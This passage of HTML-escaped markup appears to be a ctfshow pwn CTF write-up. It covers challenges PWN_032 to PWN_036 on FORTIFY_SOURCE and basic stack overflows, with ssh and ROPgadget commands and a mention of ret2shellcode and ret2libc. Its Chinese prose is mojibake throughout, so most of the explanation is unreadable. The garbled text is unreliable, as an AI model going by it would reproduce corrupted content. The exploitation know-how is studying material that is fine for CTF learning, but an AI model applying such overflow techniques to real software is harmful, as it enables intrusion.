&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;%s %s&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;fgets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_bss_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;num&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;Undefined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;å¤§è‡´æ˜¯ï¼šèµ·åˆå…ˆæ‰“å°ctfshowçš„logoä¿¡æ¯ï¼ˆå…¶å®ä¸€å¼€å§‹é‚£ä¸ªv3æŠŠæˆ‘ææ‡µäº†ï¼Œå…¶å®å¯¹è§£é¢˜è¿‡ç¨‹æ²¡å•¥å¸®åŠ©çš„ï¼‰ï¼Œåœ¨æœ€é¡¶ç«¯çš„__fastcall mainå·²ç»æŠŠä¸€äº›å‚æ•°ç»™å®šä¹‰äº†æ¯”å¦‚argvæ•°ç»„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°argv[1]è¢«èµ‹ç»™v4ï¼Œv4ä½œä¸­ä»‹æŠŠæ•°å€¼ä¼ é€’ç»™äº†buf1ï¼Œä¹‹åç¨‹åºå°†v4[10]æ•°ç»„å†…å®¹èµ‹å€¼ç»™buf1[10]ï¼Œæ¥ç€é€šè¿‡strcpyå‡½æ•°ï¼ŒæŠŠå­—ç¬¦ä¸²â€œCTFshowPWNâ€å¤åˆ¶/èµ‹å€¼ç»™buf2ï¼Œprintfæ‰“å°buf1ã€buf2çš„å½“å‰çš„å­—ç¬¦ä¸²å†…å®¹ï¼Œæœ€åfgetè¯»å–_bss_startçš„11ä¸ªå­—ç¬¦ç»™buf1ï¼Œæ‰“å°buf1å’Œnumçš„ä¿¡æ¯ï¼Œæœ€åé€šè¿‡ifåˆ¤æ–­argcæ˜¯å¦å¤§äº4(é»˜è®¤æƒ…å†µä¸‹argcæ˜¯ç­‰äº1çš„ï¼Œå› ä¸ºargv[0]å¿…å®šå­˜åœ¨ï¼Œæˆ‘ä»¬è¾“å…¥ä¸€ä¸ªå‚æ•°ï¼Œargcå°±ä¼šç­‰äº2ï¼Œä¾æ¬¡é€’æ¨)ï¼Œå¤§äº4å°±è¿›å…¥undefinedå‡½æ•°å†…&lt;/p&gt;
&lt;p&gt;å› ä¸ºæœ¬é¢˜ç›®FORTIFY_SOURCEæ²¡æœ‰å¼€å¯ï¼Œä»£è¡¨æˆ‘ä»¬å¯åŠ¨å‡½æ•°ç›´æ¥è¾“å…¥4ä¸ªå‚æ•°(è¿™æ—¶argc=5 &amp;gt; 4ï¼Œä¸ºä»€ä¹ˆäº”ä¸ªï¼Ÿå› ä¸ºä½ è¾“å…¥çš„4ä¸ª+argc[0] = 5)å°±è¡Œäº†ï¼Œè€Œä¸”è¿™4ä¸ªå‚æ•°æ²¡æœ‰é•¿åº¦é™åˆ¶ï¼Œå¦‚æœå¼€å¯FORTIFY_SOURCEå°±ä¸å¥½è¯´äº†ï¼Œå› ä¸ºå¼€å¯äº†ä¹‹åï¼Œç”±äºç¨‹åºå­˜åœ¨strcpyå’Œmemcpyå‡½æ•°ä¼šæ£€æµ‹é•¿åº¦ï¼Œå¦‚æœé•¿åº¦è¶…è¿‡äº†é™åˆ¶ï¼Œå¯èƒ½ä¼šä½¿ç¨‹åºæŠ›å‡ºå¼‚å¸¸è€Œé€€å‡ºæ‰§è¡Œã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/91.png&#34;
	width=&#34;1400&#34;
	height=&#34;756&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/91_hu_15b7482435404dc9.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/91_hu_ba35ebc958987903.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;185&#34;
		data-flex-basis=&#34;444px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;pwn_033&#34;&gt;PWN_033
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šFORTIFY_SOURCE=1ï¼š&lt;/p&gt;
&lt;p&gt;å¯ç”¨ Fortify åŠŸèƒ½çš„åŸºæœ¬çº§åˆ«ã€‚ åœ¨ç¼–è¯‘æ—¶è¿›è¡Œä¸€äº›å®‰å…¨æ£€æŸ¥ï¼Œå¦‚ç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥ã€æ ¼å¼åŒ–å­—ç¬¦ä¸²æ£€æŸ¥ç­‰ã€‚ åœ¨è¿è¡Œæ—¶è¿›è¡ŒæŸäº›æ£€æŸ¥ï¼Œå¦‚æ£€æµ‹å‡½æ•°è¿”å›å€¼å’Œå¤§å°çš„ä¸€è‡´æ€§ã€‚ å¦‚æœæ£€æµ‹åˆ°æ½œåœ¨çš„å®‰å…¨é—®é¢˜ï¼Œä¼šè§¦å‘è¿è¡Œæ—¶é”™è¯¯ï¼Œå¹¶ç»ˆæ­¢ç¨‹åºæ‰§è¡Œã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_033&#34; &gt;PWN_033&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;IDAx64åˆ†æï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/92.png&#34;
	width=&#34;890&#34;
	height=&#34;575&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/92_hu_b8d7b58369f7ed42.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/92_hu_5f64d4fe00dca924.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;154&#34;
		data-flex-basis=&#34;371px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;FORTIFY_SOURCEè¢«æ‰“å¼€äº†ï¼Œä»£ç å’ŒPWN_032å‡ ä¹ä¸€æ ·çš„ï¼Œmemcpyå’Œstrcpyè¿™ä¸¤ä¸ªå‡½æ•°è¢«æ›¿æ¢æˆäº†__mencpy_chkå’Œ__strcpy__chkå®‰å…¨å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸¤ä¸ªå‡½æ•°ç›¸æ¯”å‰ä¸¤ä¸ªå‡½æ•°åªæ˜¯åŠ ä¸Šäº†11LLè¿™ä¸ªå‚æ•°åŠ ä»¥é™åˆ¶ï¼Œå› ä¸ºbuf1å’Œbuf2åœ¨å£°æ˜çš„æ—¶å€™çš„é•¿åº¦å°±æ˜¯11ï¼Œæ‰€ä»¥ç¨‹åºä¸ºäº†é˜²æ­¢æº¢å‡ºï¼Œä½¿ç”¨åä¸¤ä¸ªå‡½æ•°åŠ ä¸Šè¿™ä¸¤ä¸ªæ•°ç»„çš„é•¿åº¦åŠ ä»¥é™åˆ¶ä»¥é˜²æº¢å‡ºã€‚&lt;/p&gt;
&lt;p&gt;ä½†è¿™ä¸å¦¨ç¢æˆ‘ä»¬æ‹¿flagå•Šï¼Œåªè¦è¿è¡Œ./pwnmeæ—¶è¾“å…¥çš„å­—ç¬¦æ€»é•¿åº¦ä¸è¶…è¿‡11å°±å¥½ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# argv[1] é•¿åº¦â‰¤10ï¼Œargv[3] â‰¤11ï¼Œæ€»å‚æ•°â‰¥5 &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$./pwnme &lt;span class=&#34;s2&#34;&gt;&amp;#34;short&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;5&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/93.png&#34;
	width=&#34;1340&#34;
	height=&#34;735&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/93_hu_9f26a9108882b142.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/93_hu_c04b5083116f2c7c.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;182&#34;
		data-flex-basis=&#34;437px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;pwn_034&#34;&gt;PWN_034
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šFORTIFY_SOURCE=2ï¼š&lt;/p&gt;
&lt;p&gt;å¯ç”¨ Fortify åŠŸèƒ½çš„é«˜çº§çº§åˆ«ã€‚ åŒ…æ‹¬åŸºæœ¬çº§åˆ«çš„å®‰å…¨æ£€æŸ¥ï¼Œå¹¶æ·»åŠ äº†æ›´å¤šçš„æ£€æŸ¥ã€‚ åœ¨ç¼–è¯‘æ—¶è¿›è¡Œæ›´ä¸¥æ ¼çš„æ£€æŸ¥ï¼Œå¦‚æ›´ç²¾ç¡®çš„ç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥ã€‚ æä¾›æ›´ä¸°å¯Œçš„ç¼–è¯‘å™¨è­¦å‘Šå’Œé”™è¯¯ä¿¡æ¯ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;IDAåˆ†æï¼Œé¢˜ç›®æè¿°ä¹Ÿè¯´äº†è¯¥ç¨‹åºåŒ…æ‹¬åŸºæœ¬çº§åˆ«çš„å®‰å…¨æ£€æŸ¥ï¼Œå¹¶æ·»åŠ äº†æ›´å¤šçš„æ£€æŸ¥ã€‚ åœ¨ç¼–è¯‘æ—¶è¿›è¡Œæ›´ä¸¥æ ¼çš„æ£€æŸ¥ï¼Œå¦‚æ›´ç²¾ç¡®çš„ç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥ã€‚ æä¾›æ›´ä¸°å¯Œçš„ç¼–è¯‘å™¨è­¦å‘Šå’Œé”™è¯¯ä¿¡æ¯ã€‚
ä½¿ç”¨ida64åç¼–è¯‘çš„åŠ è¿‡ç•¥å¾®ä¸å‰ä¸¤é“é¢˜ç›®æœ‰æ‰€ä¸åŒï¼Œå¤§éƒ¨åˆ†è¿˜æ˜¯ä¸€æ ·çš„ï¼Œè¿˜æ˜¯æŠŠå±é™©å‡½æ•°æ›¿æ¢æˆäº†å®‰å…¨å‡½æ•°ã€‚å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/94.png&#34;
	width=&#34;814&#34;
	height=&#34;505&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/94_hu_43f6bccc3a9f8aca.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/94_hu_7ea7c32cd0d7cfe1.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;161&#34;
		data-flex-basis=&#34;386px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å¤§è‡´èƒ½çœ‹å‡ºåŸå‡½æ•°æ˜¯ä»€ä¹ˆå§ï¼Œè¿™é‡Œå°±ä¸å¤šè§£é‡Šäº†&amp;hellip;&lt;/p&gt;
&lt;p&gt;# æ ¼å¼åŒ–å‡½æ•°ä¸è§£é¢˜æ“ä½œè¯´æ˜ &lt;code&gt;__printf__chk&lt;/code&gt; å‡½æ•°ä¸ &lt;code&gt;printf&lt;/code&gt; çš„åŒºåˆ«åœ¨äºï¼šä¸èƒ½ä½¿ç”¨ &lt;code&gt;%x$n&lt;/code&gt; ä¸è¿ç»­åœ°æ‰“å°ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœè¦ä½¿ç”¨ &lt;code&gt;%3$n&lt;/code&gt;ï¼Œåˆ™å¿…é¡»åŒæ—¶ä½¿ç”¨ &lt;code&gt;%1$n&lt;/code&gt; å’Œ &lt;code&gt;%2$n&lt;/code&gt;ã€‚åœ¨ä½¿ç”¨ &lt;code&gt;%n&lt;/code&gt; çš„æ—¶å€™ä¼šåšä¸€äº›æ£€æŸ¥ã€‚ è¿™æ¶‰åŠåˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æœ¬é¢˜ä¸æ¶‰åŠæ­¤æ¼æ´ï¼Œæ‰€ä»¥å¯¹æœ¬é“é¢˜å‡ ä¹æ²¡æœ‰é˜»ç¢ã€‚åç»­æˆ‘ä»¬è¿˜æ˜¯é€šè¿‡ SSH è¿æ¥åè¿è¡Œæ–‡ä»¶ï¼Œè¾“å…¥ 4 ä¸ªé•¿åº¦ä¸º 1 çš„å‚æ•°ï¼Œä¸å‡ºæ„å¤–å°±èƒ½æ‹¿åˆ° flagï¼&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/95.png&#34;
	width=&#34;1493&#34;
	height=&#34;726&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/95_hu_b3792e7f70688569.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/95_hu_abc131af3d5d11c9.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;205&#34;
		data-flex-basis=&#34;493px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;æ ˆæº¢å‡º&#34;&gt;æ ˆæº¢å‡º
&lt;/h2&gt;&lt;h3 id=&#34;pwn_035&#34;&gt;PWN_035
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šæ­£å¼å¼€å§‹æ ˆæº¢å‡ºäº†ï¼Œå…ˆæ¥ä¸€ä¸ªæœ€æœ€æœ€æœ€ç®€å•çš„å§&lt;/p&gt;
&lt;p&gt;ç”¨æˆ·åä¸º ctfshow å¯†ç  ä¸º 123456 è¯·ä½¿ç”¨ sshè½¯ä»¶è¿æ¥&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh ctfshow@é¢˜ç›®åœ°å€ -pé¢˜ç›®ç«¯å£å·
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;**ä¸æ˜¯ncè¿æ¥ **&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pan.baidu.com/s/1wHPhZ7XOouFU6KgyOiSfLQ&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ä¸“ç”¨è™šæ‹Ÿæœºé•œåƒï¼Œå…¨å¥—åœ¨è¿™é‡Œï¼Œæå–ç show&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;PWN_035&#34; &gt;PWN_035&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;checksecä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/96.png&#34;
	width=&#34;845&#34;
	height=&#34;198&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/96_hu_5cec7781a9fafd95.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/96_hu_ceae71005b53e245.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;426&#34;
		data-flex-basis=&#34;1024px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;æ²¡å¼€canaryä¿æŠ¤ï¼Œå¯¹åº”äº†æœ¬ç« ä¸»é¢˜â€”â€”æ ˆæº¢å‡ºã€‚&lt;/p&gt;
&lt;p&gt;IDAåˆ†æï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/97.png&#34;
	width=&#34;1106&#34;
	height=&#34;726&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/97_hu_8cfcbbb1f6ccb348.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/97_hu_894ff25413a0ac82.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;mainå‡½æ•°åç¼–è¯‘åˆ†æ&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;152&#34;
		data-flex-basis=&#34;365px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›å‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/98.png&#34;
	width=&#34;569&#34;
	height=&#34;200&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/98_hu_7f17590d89865cd7.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/98_hu_492c2c611443a23c.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;sigsegv_handlerå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;284&#34;
		data-flex-basis=&#34;682px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/99.png&#34;
	width=&#34;564&#34;
	height=&#34;190&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/99_hu_64242a0110d6f688.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/99_hu_f5443b1ee09bc173.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;ctfshowå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;296&#34;
		data-flex-basis=&#34;712px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ç”±æ­¤å¯çŸ¥ï¼šctfshowå‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œè¶…è¿‡104å­—èŠ‚å°±ä¼šå‘ç”Ÿæ ˆæº¢å‡ºï¼›&lt;/p&gt;
&lt;p&gt;å¯¹äº&lt;code&gt;SIGSEGV&lt;/code&gt;å‡½æ•°ï¼Œå½“æ ˆæº¢å‡ºè§¦å‘ SIGSEGV æ—¶ï¼Œsigsegv_handler å‡½æ•°ä¼šè¢«è°ƒç”¨ï¼Œç„¶åè§¦å‘å‡½æ•°å†…éƒ¨â€”â€”fprintfæ‰“å°å‡ºflagå­—ç¬¦ä¸²ï¼Œä¹Ÿæ­£å¥½å¯¹åº”äº†fgetå‡½æ•°è¯»å–çš„flagå€¼ã€‚&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-warn&#34;&gt;
    &lt;p&gt;æ ˆæº¢å‡ºä¼šç ´åæ ˆä¸Šçš„ â€œè¿”å›åœ°å€â€â€œæ ˆå¸§ä¿¡æ¯â€ æˆ–å…¶ä»–å…³é”®å†…å­˜ç»“æ„ï¼Œæœ€ç»ˆå¼•å‘&lt;strong&gt;éæ³•å†…å­˜è®¿é—®&lt;/strong&gt;ï¼ˆæ¯”å¦‚å‡½æ•°è¿”å›æ—¶è·³è½¬åˆ°æ— æ•ˆåœ°å€ï¼‰ï¼Œè§¦å‘ &lt;code&gt;SIGSEGV&lt;/code&gt; ä¿¡å·ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;æ‰€ä»¥è¯´æˆ‘ä»¬åªè¦åœ¨è¿è¡Œçš„æ—¶å€™ç»™ç¨‹åºæ‰“å…¥è¶…è¿‡104ä¸ªçš„å­—ç¬¦ä¸²å°±å¥½ï¼Œå¯ä»¥æ˜¯105ä¸ªâ€œaâ€ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/100.png&#34;
	width=&#34;1235&#34;
	height=&#34;555&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/100_hu_3fabc6f5bf3328d1.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/100_hu_28f40016a971c608.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;222&#34;
		data-flex-basis=&#34;534px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;binshåœ°å€çš„è·³è½¬åˆ©ç”¨&#34;&gt;&lt;strong&gt;/bin/shåœ°å€çš„è·³è½¬åˆ©ç”¨&lt;/strong&gt;
&lt;/h3&gt;&lt;p&gt;ç›¸è¾ƒäº32ä½ç¨‹åºï¼Œ64 ä½ç¨‹åºè°ƒç”¨å‡½æ•°éœ€æ»¡è¶³ &lt;strong&gt;æ ˆå¯¹é½&lt;/strong&gt;ï¼Œå› æ­¤æ„é€  payload æ—¶éœ€æ³¨æ„ï¼š&lt;/p&gt;
&lt;p&gt;åœ¨å®é™…è§£é¢˜ä¸­ï¼Œ&lt;code&gt;ret&lt;/code&gt; åœ°å€éœ€è¦é’ˆå¯¹å½“å‰é¢˜ç›®åŠ¨æ€è·å–ï¼Œç”¨ &lt;code&gt;ROPgadget&lt;/code&gt; å·¥å…·ç›´æ¥æœç´¢ç¨‹åºä¸­çš„ &lt;code&gt;ret&lt;/code&gt; æŒ‡ä»¤ï¼ˆæœ€å¸¸ç”¨ï¼‰ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ROPgadget --binary ./pwn &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep ret
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;pwn_036&#34;&gt;PWN_036
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šå­˜åœ¨åé—¨å‡½æ•°ï¼Œå¦‚ä½•åˆ©ç”¨ï¼Ÿ &lt;a class=&#34;link&#34; href=&#34;PWN_036&#34; &gt;PWN_036&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/101.png&#34;
	width=&#34;826&#34;
	height=&#34;231&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/101_hu_6afe63e25fe4af19.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/101_hu_ca0bed959ef72a10.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;357&#34;
		data-flex-basis=&#34;858px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;éå¸¸ä¸å®‰å…¨ï¼ï¼ï¼ï¼æ²¡æœ‰canaryä¿æŠ¤ã€‚å¯ä»¥ç”¨ret2shellcodeã€ret2libcã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/102.png&#34;
	width=&#34;1225&#34;
	height=&#34;506&#34;
